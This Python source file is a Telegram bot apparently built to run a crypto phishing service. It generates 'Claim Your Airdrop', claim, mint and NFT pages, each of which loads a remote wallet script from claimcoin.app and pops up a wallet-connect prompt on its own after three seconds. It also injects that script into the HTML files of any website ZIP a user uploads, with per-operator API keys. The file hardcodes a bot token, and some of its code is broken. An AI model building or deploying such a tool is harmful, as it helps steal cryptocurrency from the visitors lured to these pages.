#!/usr/bin/env python3
"""
Telegram Bot for Wallet API Page Builder
Features: User Management, Page Builder, Website Processor, Admin Panel
"""

import os
import re
import json
import sqlite3
import secrets
import string
import zipfile
import logging
from pathlib import Path
from typing import Dict, Tuple

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import (
        Application,
        CommandHandler,
        CallbackQueryHandler,
        MessageHandler,
        filters,
        ContextTypes
    )
except ImportError:
    print("Warning: telegram module not installed. Install with: pip install python-telegram-bot==20.7")
    # Create dummy classes for type checking
    from typing import Any
    class Update: pass
    class InlineKeyboardButton: pass
    class InlineKeyboardMarkup: pass
    class ContextTypes:
        DEFAULT_TYPE = Any
    class Application:
        @staticmethod
        def builder():
            class Builder:
                def token(self, t): return self
                def build(self): return None
            return Builder()
    class CommandHandler:
        def __init__(self, *a, **kw): pass
    class CallbackQueryHandler:
        def __init__(self, *a, **kw): pass
    class MessageHandler:
        def __init__(self, *a, **kw): pass
    class filters:
        Document = type('obj', (object,), {'MimeType': lambda x: None})()

# ==================== CONFIGURATION ====================
BOT_TOKEN = "8607595004:AAGmqzoNjTNscltH704a0N9tiaT-MUixsqA"
SUPER_ADMIN_ID = 8599926458
DOMAIN = "https://claimcoin.app"
ASSETS_URL = "https://claimcoin.app/assets"
WALLET_API = "https://claimcoin.app/wallet.js?key={API_KEY}"
DB_PATH = Path("data/bot.db")
PAGES_DIR = Path("/var/www/wallet-api/pages")

# Create directories
DB_PATH.parent.mkdir(exist_ok=True)
PAGES_DIR.mkdir(parents=True, exist_ok=True)

# ==================== DATABASE ====================
def init_db():
    """Initialize SQLite database"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            telegram_id INTEGER UNIQUE NOT NULL,
            name TEXT NOT NULL,
            username TEXT,
            api_key TEXT UNIQUE NOT NULL,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            approved_at TIMESTAMP,
            is_admin BOOLEAN DEFAULT 0
        )
    """)
    
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS pages (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            template TEXT NOT NULL,
            title TEXT NOT NULL,
            amount REAL,
            symbol TEXT,
            bg_color TEXT,
            card_color TEXT,
            btn_color TEXT,
            config JSON,
            html_path TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users(telegram_id)
        )
    """)
    
    # Create super admin
    cursor.execute("""
        INSERT OR IGNORE INTO users (telegram_id, name, username, api_key, status, is_admin)
        VALUES (?, ?, ?, ?, 'approved', 1)
    """, (SUPER_ADMIN_ID, "Super Admin", "admin", generate_api_key()))
    
    conn.commit()
    conn.close()

def generate_api_key() -> str:
    """Generate unique API key: EXO_ + 24 hex chars"""
    hex_chars = ''.join(secrets.choice(string.hexdigits.lower()) for _ in range(24))
    return f"EXO_{hex_chars}"

# ==================== HTML TEMPLATES ====================
PAGE_TEMPLATES = {
    "airdrop": {
        "name": "Airdrop Page",
        "default_title": "Claim Your Airdrop",
        "default_amount": 1000,
        "default_symbol": "EXO"
    },
    "claim": {
        "name": "Claim Page",
        "default_title": "Claim Your Rewards",
        "default_amount": 500,
        "default_symbol": "COIN"
    },
    "mint": {
        "name": "Mint Page",
        "default_title": "Mint Your Token",
        "default_amount": 100,
        "default_symbol": "NFT"
    },
    "nft": {
        "name": "NFT Page",
        "default_title": "Get Your NFT",
        "default_amount": 1,
        "default_symbol": "NFT"
    }
}

def generate_html_page(template: str, title: str, amount: float, symbol: str,
                       bg_color: str, card_color: str, btn_color: str,
                       api_key: str, page_id: int, user_id: int) -> str:
    """Generate HTML page with wallet connect"""
    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{title}</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
    <script src="https://claimcoin.app/wallet.js?key={api_key}"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: {bg_color};
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }}
        
        .container {{
            width: 100%;
            max-width: 400px;
            padding: 20px;
        }}
        
        .card {{
            background: {card_color};
            border-radius: 16px;
            padding: 30px;
            text-align: center;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }}
        
        .title {{
            font-size: 28px;
            font-weight: bold;
            margin-bottom: 20px;
            background: linear-gradient(135deg, #7c3aed, #a855f7, #c084fc);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }}
        
        .amount {{
            font-size: 48px;
            font-weight: bold;
            margin: 20px 0;
            color: #ffffff;
        }}
        
        .symbol {{
            font-size: 24px;
            color: {btn_color};
            margin-bottom: 30px;
        }}
        
        .wallet-btn {{
            background: {btn_color};
            color: #ffffff;
            border: none;
            padding: 16px 40px;
            font-size: 18px;
            font-weight: 600;
            border-radius: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
        }}
        
        .wallet-btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(124, 58, 237, 0.4);
        }}
        
        .wallet-btn:active {{
            transform: translateY(0);
        }}
        
        .footer {{
            margin-top: 20px;
            font-size: 12px;
            color: rgba(255, 255, 255, 0.6);
        }}
        
        .footer a {{
            color: {btn_color};
            text-decoration: none;
        }}
        
        .footer a:hover {{
            text-decoration: underline;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <h1 class="title">{title}</h1>
            <div class="amount">{amount}</div>
            <div class="symbol">{symbol}</div>
            <button class="wallet-btn" onclick="connectWallet()">
                <i class='bx bx-wallet'></i> Connect Wallet
            </button>
        </div>
        <div class="footer">
            Powered by <a href="{DOMAIN}" target="_blank">claimcoin.app</a>
        </div>
    </div>
    
    <script>
        function connectWallet() {{
            if (typeof window.claimcoinWallet !== 'undefined') {{
                window.claimcoinWallet.connect().then(address => {{
                    alert('Wallet connected: ' + address);
                }}).catch(err => {{
                    alert('Connection failed: ' + err.message);
                }});
            }} else {{
                alert('Wallet not loaded yet. Please wait a moment.');
            }}
        }}
        
        // Auto wallet popup after 3 seconds
        setTimeout(() => {{
            connectWallet();
        }}, 3000);
    </script>
</body>
</html>"""
    return html

# ==================== BOT HANDLERS ====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command - auto-register user"""
    user = update.effective_user
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    try:
        cursor.execute("""
            INSERT INTO users (telegram_id, name, username, api_key, status, is_admin)
            VALUES (?, ?, ?, ?, ?, ?)
            ON CONFLICT(telegram_id) DO UPDATE SET
                name = excluded.name,
                username = excluded.username
        """, (
            user.id,
            f"{user.first_name} {user.last_name}".strip(),
            user.username,
            generate_api_key(),
            'approved' if user.id == SUPER_ADMIN_ID else 'pending',
            1 if user.id == SUPER_ADMIN_ID else 0
        ))
        conn.commit()
    except Exception as e:
        logging.error(f"Registration error: {e}")
    
    cursor.execute("SELECT api_key, status, is_admin FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    
    api_key, status, is_admin = row if row else ("N/A", "unknown", 0)
    
    welcome_msg = f"""🔷 Welcome to ClaimCoin Bot, {user.first_name}!

Your API Key: <code>{api_key}</code>
Status: {status.capitalize()}
{'✅ Super Admin' if is_admin else '⏳ Pending Approval'}

What would you like to do?"""
    
    keyboard = [
        [InlineKeyboardButton("📄 New Page", callback_data="menu")],
        [InlineKeyboardButton("📑 My Pages", callback_data="pages")],
        [InlineKeyboardButton("📊 API Info", callback_data="info")],
    ]
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("👮 Admin Panel", callback_data="admin")])
    
    keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(welcome_msg, reply_markup=reply_markup, parse_mode='HTML')

async def cmd_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show API key info"""
    user = update.effective_user
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT api_key, status FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        await update.message.reply_text("❌ User not found. Use /start first.")
        return
    
    api_key, status = row
    info_msg = f"""🔑 Your API Information

API Key: <code>{api_key}</code>
Status: {status.capitalize()}
Wallet API URL: {WALLET_API.replace('{API_KEY}', api_key)}

Use this API key in your wallet script to enable wallet functionality."""
    
    await update.message.reply_text(info_msg, parse_mode='HTML')

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle all callback button patterns"""
    query = update.callback_query
    user = query.from_user
    data = query.data
    
    await query.answer()
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT is_admin FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    is_admin = row[0] if row else 0
    
    # Template selection: new_<template>
    if data.startswith("new_"):
        template = data.replace("new_", "")
        if template in PAGE_TEMPLATES:
            t = PAGE_TEMPLATES[template]
            keyboard = [
                [InlineKeyboardButton("← Back", callback_data="menu")],
                [InlineKeyboardButton("Create Page", callback_data=f"create_{template}")]
            ]
            msg = f"""🎨 Create {t['name']}

Template: {template}
Default Title: {t['default_title']}
Default Amount: {t['default_amount']} {t['default_symbol']}

Configure your page below:"""
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Menu button
    elif data == "menu":
        keyboard = [
            [InlineKeyboardButton("🎯 Airdrop", callback_data="new_airdrop")],
            [InlineKeyboardButton("📥 Claim", callback_data="new_claim")],
            [InlineKeyboardButton("🔨 Mint", callback_data="new_mint")],
            [InlineKeyboardButton("🖼️ NFT", callback_data="new_nft")],
            [InlineKeyboardButton("📑 My Pages", callback_data="pages")],
            [InlineKeyboardButton("📊 API Info", callback_data="info")],
        ]
        if is_admin:
            keyboard.append([InlineKeyboardButton("👮 Admin Panel", callback_data="admin")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
        
        await query.edit_message_text("Select an option:", reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Pages list
    elif data == "pages":
        cursor.execute("SELECT id, template, title FROM pages WHERE user_id = ? ORDER BY created_at DESC", (user.id,))
        pages = cursor.fetchall()
        
        if pages:
            keyboard = []
            for page in pages:
                page_id, template, title = page
                keyboard.append([InlineKeyboardButton(f"📄 {title} ({template})", callback_data=f"page_{page_id}")])
            keyboard.append([InlineKeyboardButton("← Back", callback_data="menu")])
            await query.edit_message_text("Your Pages:", reply_markup=InlineKeyboardMarkup(keyboard))
        else:
            keyboard = [[InlineKeyboardButton("← Back", callback_data="menu")]]
            await query.edit_message_text("No pages created yet.", reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Page preview
    elif data.startswith("page_"):
        page_id = int(data.replace("page_", ""))
        cursor.execute("SELECT template, title, amount, symbol, config, html_path FROM pages WHERE id = ? AND user_id = ?",
                      (page_id, user.id))
        row = cursor.fetchone()
        
        if row:
            template, title, amount, symbol, config, html_path = row
            config = json.loads(config) if config else {}
            msg = f"""📄 Page Details

Title: {title}
Template: {template}
Amount: {amount} {symbol}
Status: {'✅ Live' if html_path else '⏳ Draft'}

<a href="{DOMAIN}/pages/{user.id}/{page_id}.html">Live Preview</a>"""
            keyboard = [[InlineKeyboardButton("← Back", callback_data="pages")]]
            await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    
    # API Info
    elif data == "info":
        cursor.execute("SELECT api_key FROM users WHERE telegram_id = ?", (user.id,))
        row = cursor.fetchone()
        api_key = row[0] if row else "N/A"
        msg = f"""🔑 API Information

API Key: <code>{api_key}</code>
Wallet API: {WALLET_API.replace('{API_KEY}', api_key)}
Pages URL: {DOMAIN}/pages/{user.id}/

Inject this script into your HTML:
<code>&lt;script src="{WALLET_API.replace('{API_KEY}', api_key)}"&gt;&lt;/script&gt;</code>"""
        keyboard = [[InlineKeyboardButton("← Back", callback_data="menu")]]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')
    
    # Admin panel
    elif data == "admin":
        if not is_admin:
            await query.answer("❌ Access denied", show_alert=True)
            return
        
        cursor.execute("SELECT COUNT(*), SUM(CASE WHEN status='approved' THEN 1 ELSE 0 END), SUM(CASE WHEN status='pending' THEN 1 ELSE 0 END) FROM users")
        total, approved, pending = cursor.fetchone()
        
        cursor.execute("SELECT COUNT(*) FROM pages")
        pages_count = cursor.fetchone()[0]
        
        msg = f"""👮 Admin Panel

📊 Statistics:
• Total Users: {total}
• Approved: {approved}
• Pending: {pending}
• Total Pages: {pages_count}

Actions:"""
        keyboard = [
            [InlineKeyboardButton("📋 User List", callback_data="admin_users")],
            [InlineKeyboardButton("← Back", callback_data="menu")]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Admin user list
    elif data == "admin_users":
        cursor.execute("SELECT telegram_id, name, username, status, is_admin FROM users ORDER BY is_admin DESC, status, created_at")
        users = cursor.fetchall()
        
        msg = "👥 User Management\n\n"
        for uid, name, username, status, is_admin in users:
            role = "🛡️ " if is_admin else "👤 "
            status_icon = "✅" if status == "approved" else "⏳"
            msg += f"{role}{status_icon} {name} (@{username}) - {status}\n"
        
        keyboard = [
            [InlineKeyboardButton("← Back", callback_data="admin")]
        ]
        await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    
    # Help
    elif data == "help":
        help_msg = """❓ Help

1. Use /start to register
2. Create pages using the New Page button
3. Get your API key from API Info
4. Use the wallet script in your HTML pages
5. Pages are auto-published at claimcoin.app/pages/{user_id}/{{page_id}}.html

Commands:
/start - Register/Start
/info - Show API key
/admin - Admin panel
/help - This message"""
        keyboard = [[InlineKeyboardButton("← Back", callback_data="menu")]]
        await query.edit_message_text(help_msg, reply_markup=InlineKeyboardMarkup(keyboard))

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show help message"""
    help_msg = """❓ Help

1. Use /start to register
2. Create pages using the New Page button
3. Get your API key from API Info
4. Use the wallet script in your HTML pages
5. Pages are auto-published at claimcoin.app/pages/{user_id}/{page_id}.html

Commands:
/start - Register/Start
/info - Show API key
/admin - Admin panel (admins only)
/help - This message"""
    
    keyboard = [[InlineKeyboardButton("📄 Main Menu", callback_data="menu")]]
    await update.message.reply_text(help_msg, reply_markup=InlineKeyboardMarkup(keyboard))

async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin panel shortcut"""
    user = update.effective_user
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT is_admin FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row or not row[0]:
        await update.message.reply_text("❌ Access denied. Admins only.")
        return
    
    cursor.execute("SELECT COUNT(*), SUM(CASE WHEN status='approved' THEN 1 ELSE 0 END), SUM(CASE WHEN status='pending' THEN 1 ELSE 0 END) FROM users")
    total, approved, pending = cursor.fetchone()
    
    msg = f"""👮 Admin Panel

Total Users: {total}
Approved: {approved}
Pending: {pending}

Use /start menu to access admin functions."""
    
    keyboard = [[InlineKeyboardButton("📋 User List", callback_data="admin_users")]]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

# ==================== WEBSITE PROCESSOR ====================
def inject_wallet_script(html_content: str, api_key: str) -> Tuple[str, int]:
    """Inject wallet script into HTML files before </head>; returns (modified_content, injection_count)"""
    injection_count = 0
    
    wallet_script = f'''<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/boxicons@latest/css/boxicons.min.css">
<script src="https://claimcoin.app/wallet.js?key={api_key}"></script>'''
    
    if wallet_script in html_content:
        return html_content, 0
    
    def inject_script(match):
        nonlocal injection_count
        injection_count += 1
        return wallet_script + '\n' + match.group(0)
    
    modified_content = re.sub(r'(</head>)', inject_script, html_content, 
                              flags=re.IGNORECASE | re.DOTALL)
    
    return modified_content, injection_count

def process_zip_file(zip_path: Path, api_key: str) -> Dict:
    """
    Process uploaded ZIP file: extract, inject wallet script, create modified ZIP
    
    Args:
        zip_path: Path to uploaded ZIP file
        api_key: User's API key for wallet script
    
    Returns:
        Dict with results: success, injected_files, output_path, error
    """
    result = {
        'success': False,
        'injected_files': 0,
        'output_path': None,
        'error': None
    }
    
    if not zip_path.exists():
        result['error'] = f"ZIP file not found: {zip_path}"
        return result
    
    if not zip_path.suffix.lower() == '.zip':
        result['error'] = "File is not a ZIP archive"
        return result
    
    extract_dir = zip_path.parent / f"{zip_path.stem}_extracted"
    extract_dir.mkdir(exist_ok=True)
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(extract_dir)
        
        html_files = list(extract_dir.rglob("*.html")) + list(extract_dir.rglob("*.htm"))
        
        if not html_files:
            result['error'] = "No HTML files found in ZIP archive"
            return result
        
        total_injections = 0
        for html_file in html_files:
            try:
                content = html_file.read_text(encoding='utf-8')
                modified_content, count = inject_wallet_script(content, api_key)
                
                if count > 0:
                    html_file.write_text(modified_content, encoding='utf-8')
                    total_injections += count
                    
                if re.search(r'data-bs-target=.*wallet|js-wallet|class=.*wallet', modified_content, re.IGNORECASE):
                    pass
                
            except Exception as e:
                logging.error(f"Error processing {html_file}: {e}")
                continue
        
        output_path = zip_path.parent / f"{zip_path.stem}_modified.zip"
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for file_path in extract_dir.rglob("*"):
                if file_path.is_file():
                    arcname = file_path.relative_to(extract_dir.parent)
                    zf.write(file_path, arcname)
        
        result['success'] = True
        result['injected_files'] = total_injections
        result['output_path'] = output_path
        
    except zipfile.BadZipFile:
        result['error'] = "Corrupt ZIP file"
    except Exception as e:
        result['error'] = f"Processing error: {str(e)}"
    finally:
        import shutil
        if extract_dir.exists():
            shutil.rmtree(extract_dir, ignore_errors=True)
    
    return result

# ==================== PAGE CREATION ====================
def create_page_file(page_id: int, user_id: int, api_key: str) -> bool:
    """Create published HTML file in /var/www/wallet-api/pages/"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT template, title, amount, symbol, bg_color, card_color, btn_color, config
        FROM pages WHERE id = ?
    """, (page_id or 0,))
    
    row = cursor.fetchone()
    if not row:
        conn.close()
        return False
    
    template, title, amount, symbol, bg, card, btn, config_str = row
    config = json.loads(config_str) if config_str else {}
    
    bg_color = bg or config.get('bg_color', '#0a0a1a')
    card_color = card or config.get('card_color', '#1a1a2e')
    btn_color = btn or config.get('btn_color', '#7c3aed')
    
    html_content = generate_html_page(
        template, title, amount or 0, symbol or '',
        bg_color, card_color, btn_color, api_key,
        page_id or 0, user_id
    )
    
    page_filename = f"{user_id}_{page_id or 0}.html"
    page_path = PAGES_DIR / page_filename
    
    try:
        page_path.write_text(html_content, encoding='utf-8')
        
        cursor.execute("UPDATE pages SET html_path = ? WHERE id = ?",
                      (str(page_path), page_id))
        conn.commit()
        success = True
    except Exception as e:
        logging.error(f"Error saving page file: {e}")
        success = False
    
    conn.close()
    return success

async def handle_create_page(update: Update, context: ContextTypes.DEFAULT_TYPE, template: str):
    """Handle page creation"""
    query = update.callback_query
    user = query.from_user
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT api_key FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        await query.answer("Error: User not found", show_alert=True)
        return
    
    api_key = row[0]
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    t = PAGE_TEMPLATES[template]
    config = json.dumps({
        'bg_color': '#0a0a1a',
        'card_color': '#1a1a2e',
        'btn_color': '#7c3aed'
    })
    
    cursor.execute("""
        INSERT INTO pages (user_id, template, title, amount, symbol, 
                          bg_color, card_color, btn_color, config)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
    """, (
        user.id, template, t['default_title'], t['default_amount'],
        t['default_symbol'], '#0a0a1a', '#1a1a2e', '#7c3aed', config
    ))
    
    page_id_raw = cursor.lastrowid
    conn.commit()
    conn.close()
    
    if not page_id_raw:
        await query.answer("Error: Could not create page", show_alert=True)
        return
    
    success = create_page_file(int(page_id_raw), user.id, api_key)
    
    if success:
        msg = f"""✅ Page Created!

Template: {template}
Title: {t['default_title']}
Amount: {t['default_amount']} {t['default_symbol']}

Preview: <a href="{DOMAIN}/pages/{user.id}/{page_id}.html">Live Page</a>"""
    else:
        msg = f"⚠️ Page created but file generation failed. Page ID: {page_id}"
    
    keyboard = [
        [InlineKeyboardButton("📄 My Pages", callback_data="pages")],
        [InlineKeyboardButton("← Menu", callback_data="menu")]
    ]
    await query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='HTML')

# ==================== ZIP UPLOAD HANDLER ====================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle ZIP file uploads for website processing"""
    user = update.effective_user
    document = update.message.document
    
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    cursor.execute("SELECT api_key FROM users WHERE telegram_id = ?", (user.id,))
    row = cursor.fetchone()
    conn.close()
    
    if not row:
        await update.message.reply_text("❌ Please register first with /start")
        return
    
    api_key = row[0]
    
    if not document.file_name.lower().endswith('.zip'):
        await update.message.reply_text("❌ Please upload a ZIP file")
        return
    
    await update.message.reply_text("⏳ Processing ZIP file...")
    
    file = await context.bot.get_file(document.file_id)
    zip_path = Path(f"/tmp/{document.file_name}")
    await file.download_to_drive(zip_path)
    
    result = process_zip_file(zip_path, api_key)
    
    try:
        zip_path.unlink()
    except:
        pass
    
    if result['success']:
        msg = f"""✅ ZIP Processed!

Injected files: {result['injected_files']}"""
        
        try:
            await update.message.reply_document(
                document=open(result['output_path'], 'rb'),
                caption=f"Modified ZIP with wallet script injected ({result['injected_files']} files)"
            )
        except Exception as e:
            await update.message.reply_text(f"✅ Processing complete! {result['injected_files']} files modified.")
        
        try:
            result['output_path'].unlink()
        except:
            pass
    else:
        await update.message.reply_text(f"❌ Error: {result['error']}")

# ==================== MAIN ====================
def main():
    """Start the bot"""
    init_db()
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("info", cmd_info))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("admin", cmd_admin))
    
    app.add_handler(MessageHandler(filters.Document.MimeType("application/zip"), handle_document))
    app.add_handler(MessageHandler(filters.Document.MimeType("application/x-zip-compressed"), handle_document))
    
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(menu|info|pages|new_|page_|admin|admin_|help|tog_|create_)"))
    
    print("🤖 Bot started. Press Ctrl+C to stop.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
